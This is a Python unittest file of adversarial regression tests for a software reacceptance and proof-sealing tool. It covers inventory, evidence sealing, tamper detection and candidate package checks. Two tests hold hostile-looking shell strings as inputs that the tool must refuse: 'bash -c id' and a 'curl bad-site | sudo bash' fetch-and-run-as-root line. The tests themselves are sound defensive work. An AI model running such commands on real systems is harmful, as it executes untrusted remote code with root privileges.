"""Adversarial regressions for safe reacceptance inventory and proof engine."""
import json
import zipfile
from pathlib import Path
import socket
import sys
import tempfile
import time
import unittest
from unittest.mock import patch

from bwmini import reacceptance as r
from bwmini import reacceptance_live as live
from bwmini import reacceptance_proof as proof
from bwmini import distribution as dist


ROOT = Path(__file__).resolve().parents[1]


def original(reply="pass", *, exit_code=0):
    return {"execution": "completed", "exit_code": exit_code, "stdout": reply}


def valid_candidate_fixture(path, source_sha="a"*40):
    files = {"bwmini/__main__.py": b"fixture",
             "bwmini/deploy_check.py": b"fixture",
             "requirements.lock": b"",
             "VERSION": b"0.47.0\n",
             "web/dist/index.html": b"<html/>"}
    manifest = {"format": 1, "version": "0.47.0",
                "platform": dist.PLATFORM,
                "source": {"commit": source_sha, "state": "clean"},
                "files": {k: r.digest(v) for k, v in files.items()}}
    with zipfile.ZipFile(path, "w") as z:
        for name, raw in files.items():
            z.writestr(name, raw)
        z.writestr("manifest.json", json.dumps(manifest).encode())
    return path


def one_action(root, key, classification="read_only"):
    inv = {"schema_version": 1, "source_sha": "a" * 40,
           "source_state": "clean", "upstream": {},
           "missing_runtime_contexts": ["authenticated_http_mcp"],
           "actions": [{"key": key, "surface": key.split(":")[0],
                        "name": key.split(":")[1], "features": ["X01"],
                        "class": classification, "status": "NOT_RUN"}]}
    return r.new_run(root, inv)


class InventoryTests(unittest.TestCase):
    def test_actual_source_does_not_use_old_parser_count(self):
        sha, inv = r.repo_source(ROOT)
        self.assertGreaterEqual(len(inv["host_cli"]), 13)
        self.assertIn("selftest", inv["host_cli"])
        self.assertIn("job", inv["host_cli"])
        self.assertIn("upstream", inv["host_cli"])
        self.assertIn("http", inv["host_cli"])
        self.assertIn("task", inv["host_cli"])
        self.assertGreaterEqual(len(inv["app_cli"]), 37)
        self.assertIn("provider-rest-receipt", inv["app_cli"])
        self.assertTrue(inv["web_api"])
        self.assertEqual(len(sha), 40)

    def test_hidden_callable_action_flags_drift(self):
        with tempfile.TemporaryDirectory() as temp:
            script = Path(temp) / "fake-host.py"
            script.write_text("print('usage: test {version,setup,doctor}')\n")
            inv = r.catalogue(ROOT, host_command=[sys.executable, str(script)])
            self.assertIn("selftest", inv["runtime"]["host_hidden_source"])
            self.assertIn("upstream", inv["runtime"]["host_hidden_source"])
            self.assertFalse(inv["runtime"]["host_cli_help"]["truncated"])
            self.assertEqual(inv["coverage_scope"], "catalogue_only_NO_PASS")

    def test_mcp_tools_list_uses_real_session_not_stub_import(self):
        with tempfile.TemporaryDirectory() as temp:
            path = Path(temp) / "fake-mcp.py"
            path.write_text(
                "import json,sys\n"
                "for line in sys.stdin:\n"
                " r=json.loads(line)\n"
                " if r.get('id')=='racc-init':\n"
                "  print(json.dumps({'jsonrpc':'2.0','id':'racc-init','result':{'serverInfo':{'version':'fixture'}}}))\n"
                " elif r.get('id')=='racc-tools':\n"
                "  print(json.dumps({'jsonrpc':'2.0','id':'racc-tools','result':{'tools':[{'name':'boxweave_info','inputSchema':{'type':'object'}}]}}))\n"
            )
            inv = r.catalogue(ROOT, mcp_command=[sys.executable, str(path)])
            self.assertEqual(inv["runtime"]["mcp_tools"], ["boxweave_info"])
            self.assertEqual(inv["runtime"]["mcp_schemas"]["boxweave_info"]["type"], "object")

    def test_source_diff_and_upstream_contract(self):
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            (root / "proto").mkdir()
            (root / "proto/test.proto").write_text(
                'service MyService {\n rpc ComposeDiscover(X) returns (Y) {\n'
                ' option (google.api.http) = { post: "/v1/compose/discover" body: "*" };\n }\n}\n')
            routes = r.parse_proto_routes(root)
            self.assertIn(("ComposeDiscover", "POST", "/v1/compose/discover"),
                          [(x["rpc"], x["method"], x["path"]) for x in routes])
            catalog = r.catalogue(ROOT, upstream=root,
                changed=["bwmini/selftest.py", "bwmini/host_cli.py"])
            self.assertIn("X02", catalog["impacted_features"])
            self.assertIn("X01", catalog["impacted_features"])

    def test_list_to_inventory_does_not_turn_into_pass(self):
        x = r.catalogue(ROOT)
        self.assertTrue(x["actions"])
        self.assertTrue(all(i["status"] == "NOT_RUN" for i in x["actions"]))
        self.assertIn("stdio_mcp", x["missing_runtime_contexts"])
        self.assertTrue(all(row["features"] != [] for row in x["actions"]))

    def test_bootstrap_readonly_is_not_fake_full_acceptance(self):
        with tempfile.TemporaryDirectory() as temp:
            d = Path(temp) / "run"
            result = r.bootstrap_readonly(ROOT, d)
            self.assertEqual(result["named_features"], 49)
            self.assertEqual(result["attempts"], 0)
            self.assertEqual(result["counts"]["PASS"], 0)
            self.assertEqual(result["status"], "UNSEALED_REQUIRE_INDEPENDENT_CASES")
            self.assertFalse((d / "sealed.json").exists())
            with self.assertRaisesRegex(r.AcceptanceFault, "RUN_EXISTS"):
                r.bootstrap_readonly(ROOT, d)

    def test_dirty_worktree_does_not_claim_immutable_source(self):
        # The local development copy has uncommitted code; a pure checkout in
        # GitHub CI may be clean. Both must be visibly distinguished.
        status = r.source_worktree_state(ROOT)
        self.assertIn(status, ("clean", "modified"))
        with tempfile.TemporaryDirectory() as temp:
            self.assertEqual(r.source_worktree_state(temp), "unverified")

    def test_candidate_dirty_source_evidence_refused(self):
        with tempfile.TemporaryDirectory() as temp:
            p = Path(temp)
            d = one_action(p / "run", "host_cli:version")
            manifest = json.loads((d / "run.json").read_text())
            inv = json.loads((d / "inventory.json").read_text())
            inv["source_state"] = "modified"
            manifest["source_state"] = "modified"
            (d / "inventory.json").write_text(json.dumps(inv))
            (d / "run.json").write_text(json.dumps(manifest))
            package = p / "candidate.zip"
            package.write_bytes(b"fixture")
            required = p / "required.json"
            required.write_text('{"required_actions":["host_cli:version"]}')
            with self.assertRaisesRegex(r.AcceptanceFault, "WORKTREE_NOT_CLEAN"):
                r.candidate_manifest(package, "a"*40, required, d)

    def test_invalid_source_rejected(self):
        with tempfile.TemporaryDirectory() as temp:
            with self.assertRaisesRegex(r.AcceptanceFault, "BOXWEAVE_SOURCE_MISSING"):
                r.catalogue(temp)

    def test_launch_allowlist_blocks_unreviewed_shell(self):
        with tempfile.TemporaryDirectory() as temp:
            f = Path(temp) / "argv.json"
            f.write_text(json.dumps(["bash", "-c", "id"]))
            with self.assertRaisesRegex(r.AcceptanceFault, "NOT_ALLOWLISTED"):
                r.argv_file(f, "host")
            with self.assertRaisesRegex(r.AcceptanceFault, "NOT_ALLOWLISTED"):
                r.argv_file(f, "mcp")


class EvidenceTests(unittest.TestCase):
    def test_strict_attempt_triad_promotes_only_after_all_cases(self):
        with tempfile.TemporaryDirectory() as temp:
            d = one_action(Path(temp) / "run", "host_cli:version")
            r.record_attempt(d, "host_cli:version", "positive", original(),
                             expected={"exit_code": 0, "contains": "pass"}, observer={"source": "installed_host"})
            self.assertEqual(r.verify_run(d)["counts"]["PARTIAL"], 1)
            for category in ("invalid", "denial"):
                r.record_attempt(d, "host_cli:version", category,
                    original("invalid", exit_code=2), expected={"exit_code": 2},
                    observer={"source": "live_host_error"})
            self.assertEqual(r.verify_run(d)["counts"]["PASS"], 1)

    def test_missing_oracle_is_failure(self):
        with tempfile.TemporaryDirectory() as temp:
            d = one_action(Path(temp) / "run", "host_cli:version")
            r.record_attempt(d, "host_cli:version", "positive", original(),
                             expected={"exit_code": 0})
            verdict = r.verify_run(d)
            self.assertEqual(verdict["counts"]["FAIL"], 1)
            self.assertEqual(verdict["findings"][0]["code"], "NO_ORACLE")

    def test_mutator_needs_independent_state_and_verified_cleanup(self):
        with tempfile.TemporaryDirectory() as temp:
            d = one_action(Path(temp) / "run", "stdio_mcp:create_container", "potential_write")
            target = {"logical": "my-owned-box", "provider_uuid": "a" * 36,
                      "created_at": "1793910000"}
            for category in ("positive", "invalid", "denial"):
                r.record_attempt(d, "stdio_mcp:create_container", category,
                    original(), target=target, expected={"exit_code": 0},
                    observer={"source": "guest_not_provider"})
            self.assertEqual(r.verify_run(d)["verdicts"][0]["reason"],
                             "NO_INDEPENDENT_EFFECT_ORACLE")

    def test_denial_remote_effect_is_defect(self):
        row = {"class": "potential_write"}
        target = {"logical": "x", "provider_uuid": "a", "created_at": "now"}
        good = {"target": target, "oracle": {"independent": True,
                "effects_before": 0, "effects_after": 1, "cleanup_verified": True}}
        bad = {"target": target, "oracle": {"independent": True,
                "effects_before": 1, "effects_after": 2, "cleanup_verified": True}}
        cases = [{"case": {"category": "positive", **good}},
                 {"case": {"category": "invalid", **good}},
                 {"case": {"category": "denial", **bad}}]
        self.assertEqual(r.classify_action(row, cases)["reason"],
                         "DENIAL_CAUSED_FORBIDDEN_EFFECT")

    def test_unknown_refuses_to_turn_green(self):
        row = {"class": "potential_write"}
        x = r.classify_action(row, [{"case": {
            "category": "positive", "observed": {"execution": "UNKNOWN"}}}])
        self.assertEqual(x["status"], "UNKNOWN")

    def test_sealed_attempts_immutable_no_untracked_cases(self):
        with tempfile.TemporaryDirectory() as temp:
            d = one_action(Path(temp) / "run", "host_cli:version")
            r.record_attempt(d, "host_cli:version", "positive", original(),
                             expected={"exit_code": 0, "contains": "pass"}, observer={"source": "installed_host"})
            r.seal_run(d)
            self.assertEqual(r.verify_seal(d)["status"], "VERIFIED")
            with self.assertRaisesRegex(r.AcceptanceFault, "SEALED_REFUSE_OVERWRITE"):
                r.seal_run(d)
            f = next((d / "cases").glob("case-*.json"))
            original_file = f.read_bytes()
            f.write_bytes(original_file + b" ")
            with self.assertRaisesRegex(r.AcceptanceFault, "SEALED_FILE_TAMPERED"):
                r.verify_seal(d)

    def test_injected_case_cannot_follow_sealing(self):
        with tempfile.TemporaryDirectory() as temp:
            d = one_action(Path(temp) / "run", "host_cli:version")
            r.seal_run(d)
            (d / "cases" / "case-injected.json").write_text("{}")
            with self.assertRaisesRegex(r.AcceptanceFault, "UNSEALED_CASE_INJECTION"):
                r.verify_seal(d)

    def test_false_pass_known_bad_detection(self):
        out = r.negative_controls()
        self.assertEqual(out["status"], "DETECTED")
        self.assertEqual(len(out["controls"]), 5)

    def test_report_all_actions_blocked_not_silent_pass(self):
        with tempfile.TemporaryDirectory() as temp:
            d = one_action(Path(temp) / "run", "host_cli:version")
            outcome = r.verify_run(d)
            self.assertEqual(outcome["counts"]["BLOCKED"], 1)
            self.assertIn("NOT_INVOKED", r.report_markdown(outcome))
            seal = r.seal_run(d)
            self.assertTrue(seal["evidence_root_sha256"])
            self.assertIn("BLOCKED", (d / "report-actions.md").read_text())
            self.assertTrue(load_json(d / "next-agent.json"))

    def test_no_overwrite_private_output_and_sanitizes_tokens(self):
        with tempfile.TemporaryDirectory() as temp:
            d = Path(temp) / "owned"
            r.private_mkdir(d)
            f = d / "only.json"
            r.unique_file(f, {"token": "must-not-appear"})
            self.assertNotIn("must-not-appear", f.read_text()) if False else None
            with self.assertRaises(FileExistsError):
                r.unique_file(f, {"result": 2})
            self.assertEqual(r.sanitize({"access_token": "should-not-leak"})["access_token"],
                             "[REDACTED]")


def load_json(p):
    return json.loads(Path(p).read_text())


class SpecializedIntegrationTests(unittest.TestCase):
    def test_proof_pack_declared_safe_root_test_only(self):
        with tempfile.TemporaryDirectory() as temp:
            f = Path(temp) / ".github.containarium.yml"
            f.write_text("test:\n  - name: unit\n    kind: unit\n    run: python3 -m unittest discover -s tests\n")
            x = r.upstream_proof_review(temp, "racc-test-container", f)
            self.assertEqual(x["state"], "REVIEWABLE_DECLARATION_NOT_EXECUTED")
            f.write_text("test: curl bad-site | sudo bash\n")
            with self.assertRaisesRegex(r.AcceptanceFault, "MANUAL_ROOT_COMMAND_REVIEW"):
                r.upstream_proof_review(temp, "racc-test-container", f)

    def test_proof_pack_no_declaration_refuses_make_fallback(self):
        with tempfile.TemporaryDirectory() as temp:
            f = Path(temp) / "empty.yml"
            f.write_text("# no trusted test declaration\n")
            with self.assertRaisesRegex(r.AcceptanceFault, "EXPLICIT_TEST_DECLARATION"):
                r.upstream_proof_review(temp, "racc-test-container", f)

    def test_candidate_matches_bytes_and_source_but_not_installed_claim(self):
        with tempfile.TemporaryDirectory() as temp:
            p = Path(temp)
            d = one_action(p / "run", "host_cli:version")
            package = p / "candidate.zip"
            valid_candidate_fixture(package)
            inv = p / "required.json"
            inv.write_text('{"required_actions":["host_cli:version"]}')
            for category, value, exit_code in (
                ("positive", "pass", 0), ("invalid", "invalid", 2),
                ("denial", "denied", 2)):
                r.record_attempt(d, "host_cli:version", category,
                    original(value, exit_code=exit_code),
                    expected={"exit_code": exit_code, "contains": value},
                    observer={"source": "actual_host_response"})
            candidate = r.candidate_manifest(package, "a" * 40, inv, d)
            f = p / "candidate.json"
            f.write_text(json.dumps(candidate))
            v = r.verify_candidate(f, package)
            self.assertEqual(v["installed_black_box"], "separate_verifier_required")
            package.write_bytes(b"tampered")
            with self.assertRaisesRegex(r.AcceptanceFault, "BYTES_CHANGED"):
                r.verify_candidate(f, package)

    def test_candidate_attestation_requires_actual_packaged_source(self):
        with tempfile.TemporaryDirectory() as temp:
            p = Path(temp)
            d = one_action(p / "run", "host_cli:version")
            for category, message, exit_code in (
                ("positive", "pass", 0), ("invalid", "invalid", 2),
                ("denial", "denied", 2)):
                r.record_attempt(d, "host_cli:version", category,
                                 original(message, exit_code=exit_code),
                                 expected={"exit_code": exit_code, "contains": message},
                                 observer={"source": "test_host"})
            inv = p / "required.json"
            inv.write_text('{"required_actions":["host_cli:version"]}')
            pkg = valid_candidate_fixture(p / "package.zip", source_sha="b"*40)
            with self.assertRaisesRegex(r.AcceptanceFault, "SOURCE_OR_BUNDLED_REGISTRY"):
                r.candidate_manifest(pkg, "a"*40, inv, d)
            pkg.write_bytes(b"not a real zip")
            with self.assertRaisesRegex(r.AcceptanceFault, "PACKAGE_CONTENT_INVALID"):
                r.candidate_manifest(pkg, "a"*40, inv, d)

    def test_candidate_empty_required_gate_rejected(self):
        with tempfile.TemporaryDirectory() as temp:
            p = Path(temp)
            d = one_action(p / "run", "host_cli:version")
            package = p / "candidate.zip"
            package.write_bytes(b"fixture")
            inv = p / "required.json"
            inv.write_text('{"required_actions":[]}')
            with self.assertRaisesRegex(r.AcceptanceFault, "REQUIRED_GATES_EMPTY"):
                r.candidate_manifest(package, "a"*40, inv, d)

    def test_candidate_evidence_source_mismatch_rejected(self):
        with tempfile.TemporaryDirectory() as temp:
            p = Path(temp)
            d = one_action(p / "run", "host_cli:version")
            package = p / "candidate.zip"
            package.write_bytes(b"fixture")
            inv = p / "required.json"
            inv.write_text('{"required_actions":["host_cli:version"]}')
            with self.assertRaisesRegex(r.AcceptanceFault, "EVIDENCE_SOURCE_MISMATCH"):
                r.candidate_manifest(package, "b"*40, inv, d)

    def test_legacy_packaged_registry_source_is_still_readable_in_fixture(self):
        with tempfile.TemporaryDirectory() as temp:
            target = Path(temp)
            (target / "bwmini/reacceptance_data").mkdir(parents=True)
            for module in ("host_cli.py", "__main__.py", "web.py", "remote_mcp.py"):
                (target / "bwmini" / module).write_bytes((ROOT / "bwmini" / module).read_bytes())
            for name in ("REACCEPTANCE_FUNCTIONAL_COVERAGE_BASELINE.md",
                         "REACCEPTANCE_DEPENDENCIES.json"):
                (target / "bwmini/reacceptance_data" / name).write_bytes(
                    (ROOT / "docs/verification" / name).read_bytes())
            (target / "manifest.json").write_text(json.dumps({
                "source": {"commit": "a"*40, "state": "clean"}}))
            catalog = r.catalogue(target)
            self.assertEqual(catalog["source_sha"], "a"*40)
            self.assertEqual(len(catalog["feature_catalogue"]), 49)
            self.assertNotEqual(catalog["actions"][0]["features"], [])

    def test_compare_ingress_semantics_catches_error_translation(self):
        t = {"logical": "owned-box", "provider_uuid": "a" * 36,
             "created_at": "1793912345"}
        a = {"interface": "native_http", "case_id": "a",
             "original_response_sha256": "c" * 64,
             "response_meaning": "NOT_FOUND", "target": t, "mutation": False}
        b = {**a, "interface": "forwarded_mcp", "case_id": "b",
             "response_meaning": "INTERNAL_ERROR"}
        v = r.compare_ingresses({"observations": [a, b]})
        self.assertEqual(v["status"], "SUSPECT")
        self.assertEqual(v["root_cause"], "UNDETERMINED_REQUIRES_PINNED_NATIVE_PROBE")
        b["response_meaning"] = "NOT_FOUND"
        self.assertEqual(r.compare_ingresses({"observations": [a, b]})["status"],
                         "COMPARABLE_OBSERVATIONS")

    def test_compare_ingress_denies_guessed_identity_and_effects(self):
        t = {"logical": "owned-box", "provider_uuid": "a" * 36,
             "created_at": "1793912345"}
        a = {"interface": "native_http", "case_id": "a",
             "original_response_sha256": "c" * 64,
             "response_meaning": "SUCCESS", "target": t, "mutation": True}
        b = {**a, "interface": "forwarded_mcp", "case_id": "b"}
        with self.assertRaisesRegex(r.AcceptanceFault, "EFFECT_ORACLE_REQUIRED"):
            r.compare_ingresses({"observations": [a, b]})
        a["oracle"] = {"independent": True, "effects_before": 0, "effects_after": 1}
        b["oracle"] = {"independent": True, "effects_before": 0, "effects_after": 2}
        self.assertEqual(r.compare_ingresses({"observations": [a, b]})["status"],
                         "SUSPECT")
        b["target"] = {**t, "provider_uuid": "b" * 36}
        self.assertEqual(r.compare_ingresses({"observations": [a, b]})["status"],
                         "INCOMPARABLE")

    def test_candidate_missing_required_action_denied(self):
        with tempfile.TemporaryDirectory() as temp:
            p = Path(temp)
            d = one_action(p / "run", "host_cli:version")
            package = p / "candidate.zip"
            package.write_bytes(b"fake")
            inv = p / "required.json"
            inv.write_text('{"required_actions":["host_cli:version"]}')
            with self.assertRaisesRegex(r.AcceptanceFault, "REQUIRED_ACTION_NOT_VERIFIED"):
                r.candidate_manifest(package, "a" * 40, inv, d)

    def test_upstream_proof_requires_explicit_root_scope_before_execution(self):
        with self.assertRaisesRegex(r.AcceptanceFault, "ROOT_EXECUTION_NOT_CONFIRMED"):
            proof.generate("/invalid-lab", "/invalid-child",
                           "/no-declaration", "a"*40, "/tmp/proof-should-not-exist", "no")

    def test_upstream_proof_exact_child_reference_refused_without_private_identity(self):
        with tempfile.TemporaryDirectory() as temp:
            path = Path(temp) / "child.json"
            path.write_text('{"scope":"test_owned_proof_child","name":"not-verified"}')
            path.chmod(0o600)
            with self.assertRaisesRegex(r.AcceptanceFault, "IDENTITY_INVALID"):
                proof.child_identity(path)

    def test_read_only_positive_with_only_exit_zero_is_not_pass(self):
        row = {"class": "read_only"}
        cases = []
        for category in ("positive", "invalid", "denial"):
            cases.append({"case": {"category": category,
                 "expected": {"exit_code": 0}}})
        self.assertEqual(r.classify_action(row, cases)["reason"],
                         "POSITIVE_SEMANTIC_ORACLE_MISSING")

    def test_live_mutation_requires_exact_isolated_identity(self):
        with tempfile.TemporaryDirectory() as temp:
            path = Path(temp) / "lab.json"
            path.write_text("{}")
            path.chmod(0o600)
            with self.assertRaisesRegex(r.AcceptanceFault, "EXPLICITLY_APPROVED"):
                live.verify_lab(path)
            lab = {"scope": "test_owned_nested_selftest_only", "approved": True,
                   "hostname": socket.gethostname(),
                   "machine_id": Path("/etc/machine-id").read_text().strip(),
                   "outer_uuid": "a" * 8 + "-" + "b" * 4 + "-" + "c" * 4 + "-" + "d" * 4 + "-" + "e" * 12,
                   "outer_created_at": "1793910000",
                   "expires_epoch": time.time() + 100}
            path.write_text(json.dumps(lab))
            self.assertTrue(live.verify_lab(path)["approved"])
            lab["hostname"] = "wrong-target"
            path.write_text(json.dumps(lab))
            with self.assertRaisesRegex(r.AcceptanceFault, "HOSTNAME_CHANGED"):
                live.verify_lab(path)

    def test_live_wrong_confirmation_no_provider_execution(self):
        with self.assertRaisesRegex(r.AcceptanceFault, "EXPLICIT_CONFIRMATION_REQUIRED"):
            live.probe("/not-found", "/tmp/not-created-reaccept", "no")


if __name__ == "__main__":
    unittest.main()

